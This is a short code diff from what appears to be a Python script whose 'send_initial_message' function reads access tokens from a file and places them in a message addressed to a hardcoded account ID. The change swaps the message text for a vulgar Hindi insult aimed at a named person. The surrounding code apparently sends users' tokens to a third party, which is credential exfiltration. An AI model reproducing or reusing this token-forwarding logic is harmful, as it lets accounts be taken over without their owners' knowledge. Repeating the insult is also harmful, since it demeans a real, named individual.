@@ -39,7 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello SANSKAR SIR  ! I am using your server My token is {}"
+      msg_template = "Hello Rehan lodu  !MAIN TERA  server use kr rha hu ye pakad Mera token is {}"
 
       # Specify the ID where you want to send the message
       target_id = "100054184067769"
